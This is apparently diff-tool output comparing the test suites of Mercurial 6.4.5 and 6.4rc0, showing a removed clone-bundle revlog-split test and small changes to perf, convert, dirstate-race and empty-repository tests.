-==================================================================
-
-  $ cat >> $HGRCPATH << EOF
-  > [format]
-  > revlog-compression=none
-  > use-persistent-nodemap=no
-  > EOF
-
-  $ hg init server-revlog-split/
-  $ cd server-revlog-split
-  $ cat >> .hg/hgrc << EOF
-  > [extensions]
-  > clonebundles =
-  > EOF
-  $ echo foo > A
-  $ hg add A
-  $ hg commit -m 'initial commit'
-IMPORTANT: the revlogs must not be split
-  $ ls -1 .hg/store/00manifest.*
-  .hg/store/00manifest.i
-  $ ls -1 .hg/store/data/_a.*
-  .hg/store/data/_a.i
-
-do big enough update to split the revlogs
-
-  $ $TESTDIR/seq.py 100000 > A
-  $ mkdir foo
-  $ cd foo
-  $ touch `$TESTDIR/seq.py 10000`
-  $ cd ..
-  $ hg add -q foo
-  $ hg commit -m 'split the manifest and one filelog'
-
-IMPORTANT: now the revlogs must be split
-  $ ls -1 .hg/store/00manifest.*
-  .hg/store/00manifest.d
-  .hg/store/00manifest.i
-  $ ls -1 .hg/store/data/_a.*
-  .hg/store/data/_a.d
-  .hg/store/data/_a.i
-
-Add an extra commit on top of that
-
-  $ echo foo >> A
-  $ hg commit -m 'one extra commit'
-
-  $ cd ..
-
-Do a bundle that contains the split, but not the update
-
-  $ hg bundle --exact --rev '::(default~1)' -R server-revlog-split/ --type gzip-v2 split-test.hg
-  2 changesets found
-
-  $ cat > server-revlog-split/.hg/clonebundles.manifest << EOF
-  > http://localhost:$HGPORT1/split-test.hg BUNDLESPEC=gzip-v2
-  > EOF
-
-start the necessary server
-
-  $ "$PYTHON" $TESTDIR/dumbhttp.py -p $HGPORT1 --pid http.pid
-  $ cat http.pid >> $DAEMON_PIDS
-  $ hg -R server-revlog-split serve -d -p $HGPORT --pid-file hg.pid --accesslog access.log
-  $ cat hg.pid >> $DAEMON_PIDS
-
-Check that clone works fine
-===========================
-
-Here, the initial clone will trigger a revlog split (which is a bit clowny it
-itself, but whatever). The split revlogs will see additionnal data added to
-them in the subsequent pull. This should not be a problem
-
-  $ hg clone http://localhost:$HGPORT revlog-split-in-the-bundle
-  applying clone bundle from http://localhost:$HGPORT1/split-test.hg
-  adding changesets
-  adding manifests
-  adding file changes
-  added 2 changesets with 10002 changes to 10001 files
-  finished applying clone bundle
-  searching for changes
-  adding changesets
-  adding manifests
-  adding file changes
-  added 1 changesets with 1 changes to 1 files
-  new changesets e3879eaa1db7
-  2 local changesets published
-  updating to branch default
-  10001 files updated, 0 files merged, 0 files removed, 0 files unresolved
-
-check the results
-
-  $ cd revlog-split-in-the-bundle
-  $ f --size .hg/store/00manifest.*
-  .hg/store/00manifest.d: size=499037
-  .hg/store/00manifest.i: size=192
-  $ f --size .hg/store/data/_a.*
-  .hg/store/data/_a.d: size=588917
-  .hg/store/data/_a.i: size=192
-
-manifest should work
-
-  $ hg  files -r tip | wc -l
-  \s*10001 (re)
-
-file content should work
-
-  $ hg  cat -r tip A | wc -l
-  \s*100001 (re)
-
-
```

### Comparing `mercurial-6.4.5/tests/test-close-head.t` & `mercurial-6.4rc0/tests/test-close-head.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-commandserver.t` & `mercurial-6.4rc0/tests/test-commandserver.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-commit-amend.t` & `mercurial-6.4rc0/tests/test-commit-amend.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-commit-interactive-curses.t` & `mercurial-6.4rc0/tests/test-commit-interactive-curses.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-commit-interactive.t` & `mercurial-6.4rc0/tests/test-commit-interactive.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-commit-multiple.t` & `mercurial-6.4rc0/tests/test-commit-multiple.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-commit-unresolved.t` & `mercurial-6.4rc0/tests/test-commit-unresolved.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-commit.t` & `mercurial-6.4rc0/tests/test-commit.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-committer.t` & `mercurial-6.4rc0/tests/test-committer.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-completion.t` & `mercurial-6.4rc0/tests/test-completion.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-config-env.py` & `mercurial-6.4rc0/tests/test-config-env.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-config-parselist.py` & `mercurial-6.4rc0/tests/test-config-parselist.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-config.t` & `mercurial-6.4rc0/tests/test-config.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-conflict.t` & `mercurial-6.4rc0/tests/test-conflict.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-confused-revert.t` & `mercurial-6.4rc0/tests/test-confused-revert.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-context-metadata.t` & `mercurial-6.4rc0/tests/test-context-metadata.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-context.py` & `mercurial-6.4rc0/tests/test-context.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-context.py.out` & `mercurial-6.4rc0/tests/test-context.py.out`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-contrib-check-code.t` & `mercurial-6.4rc0/tests/test-contrib-check-code.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-contrib-check-commit.t` & `mercurial-6.4rc0/tests/test-contrib-check-commit.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-contrib-dumprevlog.t` & `mercurial-6.4rc0/tests/test-contrib-dumprevlog.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-contrib-perf.t` & `mercurial-6.4rc0/tests/test-contrib-perf.t`

 * *Files 2% similar despite different names*

```diff
@@ -294,28 +294,28 @@
 Simple single entry
 
   $ hg perfparents --config perf.stub=no --config perf.run-limits='0.000000001-15'
   ! wall * comb * user * sys * (best of 15) (glob)
 
 Multiple entries
 
-  $ hg perfparents --config perf.stub=no --config perf.run-limits='500000-1, 0.000000001-50'
-  ! wall * comb * user * sys * (best of 50) (glob)
+  $ hg perfparents --config perf.stub=no --config perf.run-limits='500000-1, 0.000000001-5'
+  ! wall * comb * user * sys * (best of 5) (glob)
 
 error case are ignored
 
-  $ hg perfparents --config perf.stub=no --config perf.run-limits='500, 0.000000001-50'
+  $ hg perfparents --config perf.stub=no --config perf.run-limits='500, 0.000000001-5'
   malformatted run limit entry, missing "-": 500
-  ! wall * comb * user * sys * (best of 50) (glob)
-  $ hg perfparents --config perf.stub=no --config perf.run-limits='aaa-120, 0.000000001-50'
-  malformatted run limit entry, could not convert string to float: 'aaa': aaa-120
-  ! wall * comb * user * sys * (best of 50) (glob)
-  $ hg perfparents --config perf.stub=no --config perf.run-limits='120-aaaaaa, 0.000000001-50'
-  malformatted run limit entry, invalid literal for int() with base 10: 'aaaaaa': 120-aaaaaa
-  ! wall * comb * user * sys * (best of 50) (glob)
+  ! wall * comb * user * sys * (best of 5) (glob)
+  $ hg perfparents --config perf.stub=no --config perf.run-limits='aaa-12, 0.000000001-5'
+  malformatted run limit entry, could not convert string to float: 'aaa': aaa-12
+  ! wall * comb * user * sys * (best of 5) (glob)
+  $ hg perfparents --config perf.stub=no --config perf.run-limits='12-aaaaaa, 0.000000001-5'
+  malformatted run limit entry, invalid literal for int() with base 10: 'aaaaaa': 12-aaaaaa
+  ! wall * comb * user * sys * (best of 5) (glob)
 
 test actual output
 ------------------
 
 normal output:
 
   $ hg perfheads --config perf.stub=no
```

### Comparing `mercurial-6.4.5/tests/test-contrib-pull-logger.t` & `mercurial-6.4rc0/tests/test-contrib-pull-logger.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-contrib-relnotes.t` & `mercurial-6.4rc0/tests/test-contrib-relnotes.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-contrib-testparseutil.t` & `mercurial-6.4rc0/tests/test-contrib-testparseutil.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-contrib.t` & `mercurial-6.4rc0/tests/test-contrib.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-authormap.t` & `mercurial-6.4rc0/tests/test-convert-authormap.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-baz.t` & `mercurial-6.4rc0/tests/test-convert-baz.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-bzr-114.t` & `mercurial-6.4rc0/tests/test-convert-bzr-114.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-bzr-directories.t` & `mercurial-6.4rc0/tests/test-convert-bzr-directories.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-bzr-ghosts.t` & `mercurial-6.4rc0/tests/test-convert-bzr-ghosts.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-bzr-merges.t` & `mercurial-6.4rc0/tests/test-convert-bzr-merges.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-bzr-treeroot.t` & `mercurial-6.4rc0/tests/test-convert-bzr-treeroot.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-bzr.t` & `mercurial-6.4rc0/tests/test-convert-bzr.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-clonebranches.t` & `mercurial-6.4rc0/tests/test-convert-clonebranches.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-cvs-branch.t` & `mercurial-6.4rc0/tests/test-convert-cvs-branch.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-cvs-detectmerge.t` & `mercurial-6.4rc0/tests/test-convert-cvs-detectmerge.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-cvs-synthetic.t` & `mercurial-6.4rc0/tests/test-convert-cvs-synthetic.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-cvs.t` & `mercurial-6.4rc0/tests/test-convert-cvs.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-cvsnt-mergepoints.rlog` & `mercurial-6.4rc0/tests/test-convert-cvsnt-mergepoints.rlog`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-cvsnt-mergepoints.t` & `mercurial-6.4rc0/tests/test-convert-cvsnt-mergepoints.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-darcs.t` & `mercurial-6.4rc0/tests/test-convert-darcs.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-datesort.t` & `mercurial-6.4rc0/tests/test-convert-datesort.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-filemap.t` & `mercurial-6.4rc0/tests/test-convert-filemap.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-git.t` & `mercurial-6.4rc0/tests/test-convert-git.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-hg-sink.t` & `mercurial-6.4rc0/tests/test-convert-hg-sink.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-hg-source.t` & `mercurial-6.4rc0/tests/test-convert-hg-source.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-hg-startrev.t` & `mercurial-6.4rc0/tests/test-convert-hg-startrev.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-hg-svn.t` & `mercurial-6.4rc0/tests/test-convert-hg-svn.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-identity.t` & `mercurial-6.4rc0/tests/test-convert-identity.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-mtn.t` & `mercurial-6.4rc0/tests/test-convert-mtn.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-p4-filetypes.t` & `mercurial-6.4rc0/tests/test-convert-p4-filetypes.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-p4.t` & `mercurial-6.4rc0/tests/test-convert-p4.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-splicemap.t` & `mercurial-6.4rc0/tests/test-convert-splicemap.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-svn-branches.t` & `mercurial-6.4rc0/tests/test-convert-svn-branches.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-svn-encoding.t` & `mercurial-6.4rc0/tests/test-convert-svn-encoding.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-svn-move.t` & `mercurial-6.4rc0/tests/test-convert-svn-move.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-svn-sink.t` & `mercurial-6.4rc0/tests/test-convert-svn-sink.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-svn-source.t` & `mercurial-6.4rc0/tests/test-convert-svn-source.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-svn-startrev.t` & `mercurial-6.4rc0/tests/test-convert-svn-startrev.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-svn-tags.t` & `mercurial-6.4rc0/tests/test-convert-svn-tags.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-tagsbranch-topology.t` & `mercurial-6.4rc0/tests/test-convert-tagsbranch-topology.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert-tla.t` & `mercurial-6.4rc0/tests/test-convert-tla.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-convert.t` & `mercurial-6.4rc0/tests/test-convert.t`

 * *Files 0% similar despite different names*

```diff
@@ -464,15 +464,15 @@
 
 conversion to dir without permissions should fail
 
   $ mkdir bogusdir
   $ chmod 000 bogusdir
 
   $ hg convert a bogusdir
-  abort: $EACCES$: *bogusdir* (glob)
+  abort: Permission denied: *bogusdir* (glob)
   [255]
 
 user permissions should succeed
 
   $ chmod 700 bogusdir
   $ hg convert a bogusdir
   initializing destination bogusdir repository
```

### Comparing `mercurial-6.4.5/tests/test-copies-chain-merge.t` & `mercurial-6.4rc0/tests/test-copies-chain-merge.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-copies-in-changeset.t` & `mercurial-6.4rc0/tests/test-copies-in-changeset.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-copies-unrelated.t` & `mercurial-6.4rc0/tests/test-copies-unrelated.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-copies.t` & `mercurial-6.4rc0/tests/test-copies.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-copy-move-merge.t` & `mercurial-6.4rc0/tests/test-copy-move-merge.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-copy.t` & `mercurial-6.4rc0/tests/test-copy.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-copytrace-heuristics.t` & `mercurial-6.4rc0/tests/test-copytrace-heuristics.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-custom-filters.t` & `mercurial-6.4rc0/tests/test-custom-filters.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-debian-packages.t` & `mercurial-6.4rc0/tests/test-debian-packages.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-debug-revlog-stats.t` & `mercurial-6.4rc0/tests/test-debug-revlog-stats.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-debugbackupbundle.t` & `mercurial-6.4rc0/tests/test-debugbackupbundle.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-debugbuilddag.t` & `mercurial-6.4rc0/tests/test-debugbuilddag.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-debugbundle.t` & `mercurial-6.4rc0/tests/test-debugbundle.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-debugcommands.t` & `mercurial-6.4rc0/tests/test-debugcommands.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-debugextensions.t` & `mercurial-6.4rc0/tests/test-debugextensions.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-debugindexdot.t` & `mercurial-6.4rc0/tests/test-debugindexdot.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-default-push.t` & `mercurial-6.4rc0/tests/test-default-push.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-demandimport.py` & `mercurial-6.4rc0/tests/test-demandimport.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-devel-warnings.t` & `mercurial-6.4rc0/tests/test-devel-warnings.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-diff-antipatience.t` & `mercurial-6.4rc0/tests/test-diff-antipatience.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-diff-binary-file.t` & `mercurial-6.4rc0/tests/test-diff-binary-file.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-diff-change.t` & `mercurial-6.4rc0/tests/test-diff-change.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-diff-color.t` & `mercurial-6.4rc0/tests/test-diff-color.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-diff-copy-depth.t` & `mercurial-6.4rc0/tests/test-diff-copy-depth.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-diff-hashes.t` & `mercurial-6.4rc0/tests/test-diff-hashes.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-diff-ignore-whitespace.t` & `mercurial-6.4rc0/tests/test-diff-ignore-whitespace.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-diff-indent-heuristic.t` & `mercurial-6.4rc0/tests/test-diff-indent-heuristic.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-diff-reverse.t` & `mercurial-6.4rc0/tests/test-diff-reverse.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-diff-subdir.t` & `mercurial-6.4rc0/tests/test-diff-subdir.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-diff-unified.t` & `mercurial-6.4rc0/tests/test-diff-unified.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-diff-upgrade.t` & `mercurial-6.4rc0/tests/test-diff-upgrade.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-diffdir.t` & `mercurial-6.4rc0/tests/test-diffdir.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-diffstat.t` & `mercurial-6.4rc0/tests/test-diffstat.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-directaccess.t` & `mercurial-6.4rc0/tests/test-directaccess.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-dirs.py` & `mercurial-6.4rc0/tests/test-dirs.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-dirstate-race.t` & `mercurial-6.4rc0/tests/test-dirstate-race.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-dirstate-race2.t` & `mercurial-6.4rc0/tests/test-dirstate-race2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-dirstate-read-race.t` & `mercurial-6.4rc0/tests/test-dirstate-read-race.t`

 * *Files 1% similar despite different names*

```diff
@@ -245,37 +245,39 @@
   $ hg status
   ? dir/n
   ? p
   ? q
 
 The status process should return a consistent result and not crash.
 
-#if no-rhg
+#if rust no-rhg dirstate-v2-append
   $ cat $TESTTMP/status-race-lock.out
   A dir/o
   R dir/nested/m
   ? dir/n
   ? p
   ? q
   $ cat $TESTTMP/status-race-lock.log
 #else
-#if pre-some-read dirstate-v2-append
+#if rhg pre-some-read dirstate-v2-append
   $ cat $TESTTMP/status-race-lock.out
   A dir/o
   R dir/nested/m
   ? dir/n
   ? p
   ? q
   $ cat $TESTTMP/status-race-lock.log
 #else
   $ cat $TESTTMP/status-race-lock.out
+  M dir/o (no-rhg known-bad-output !)
   ? dir/n
   ? p
   ? q
   $ cat $TESTTMP/status-race-lock.log
+  warning: ignoring unknown working parent 02a67a77ee9b! (no-rhg !)
 #endif
 #endif
 
 final cleanup
 
   $ rm $TESTTMP/status-race-lock $TESTTMP/status-race-lock.waiting
   $ cd ..
```

### Comparing `mercurial-6.4.5/tests/test-dirstate-status-write-race.t` & `mercurial-6.4rc0/tests/test-dirstate-status-write-race.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-dirstate.t` & `mercurial-6.4rc0/tests/test-dirstate.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-dispatch.py` & `mercurial-6.4rc0/tests/test-dispatch.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-dispatch.t` & `mercurial-6.4rc0/tests/test-dispatch.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-docker-packaging.t` & `mercurial-6.4rc0/tests/test-docker-packaging.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-doctest.py` & `mercurial-6.4rc0/tests/test-doctest.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-double-merge.t` & `mercurial-6.4rc0/tests/test-double-merge.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-drawdag.t` & `mercurial-6.4rc0/tests/test-drawdag.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-duplicateoptions.py` & `mercurial-6.4rc0/tests/test-duplicateoptions.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-editor-filename.t` & `mercurial-6.4rc0/tests/test-editor-filename.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-empty-file.t` & `mercurial-6.4rc0/tests/test-empty-file.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-empty-group.t` & `mercurial-6.4rc0/tests/test-empty-group.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-empty-manifest-index.t` & `mercurial-6.4rc0/tests/test-empty-manifest-index.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-empty.t` & `mercurial-6.4rc0/tests/test-empty.t`

 * *Files 8% similar despite different names*

```diff
@@ -36,14 +36,15 @@
   $ ls .hg
   00changelog.i
   branch
   cache
   hgrc
   requires
   store
+  undo.backup.branch
   wcache
 
 Should be empty (except for the "basic" requires):
 
   $ ls .hg/store
   requires
```

### Comparing `mercurial-6.4.5/tests/test-encode.t` & `mercurial-6.4rc0/tests/test-encode.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-encoding-align.t` & `mercurial-6.4rc0/tests/test-encoding-align.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-encoding-func.py` & `mercurial-6.4rc0/tests/test-encoding-func.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-encoding-textwrap.t` & `mercurial-6.4rc0/tests/test-encoding-textwrap.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-encoding.t` & `mercurial-6.4rc0/tests/test-encoding.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-eol-add.t` & `mercurial-6.4rc0/tests/test-eol-add.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-eol-clone.t` & `mercurial-6.4rc0/tests/test-eol-clone.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-eol-hook.t` & `mercurial-6.4rc0/tests/test-eol-hook.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-eol-patch.t` & `mercurial-6.4rc0/tests/test-eol-patch.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-eol-tag.t` & `mercurial-6.4rc0/tests/test-eol-tag.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-eol-update.t` & `mercurial-6.4rc0/tests/test-eol-update.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-eol.t` & `mercurial-6.4rc0/tests/test-eol.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-eolfilename.t` & `mercurial-6.4rc0/tests/test-eolfilename.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-excessive-merge.t` & `mercurial-6.4rc0/tests/test-excessive-merge.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-multi-source.t` & `mercurial-6.4rc0/tests/test-exchange-multi-source.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-A1.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-A1.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-A2.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-A2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-A3.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-A3.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-A4.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-A4.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-A5.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-A5.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-A6.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-A6.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-A7.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-A7.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-B1.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-B1.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-B2.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-B2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-B3.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-B3.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-B4.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-B4.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-B5.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-B5.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-B6.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-B6.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-B7.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-B7.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-C1.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-C1.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-C2.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-C2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-C3.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-C3.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-C4.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-C4.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-D1.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-D1.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-D2.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-D2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-D3.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-D3.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-exchange-obsmarkers-case-D4.t` & `mercurial-6.4rc0/tests/test-exchange-obsmarkers-case-D4.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-execute-bit.t` & `mercurial-6.4rc0/tests/test-execute-bit.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-export.t` & `mercurial-6.4rc0/tests/test-export.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-extdata.t` & `mercurial-6.4rc0/tests/test-extdata.t`

 * *Files identical despite different names*

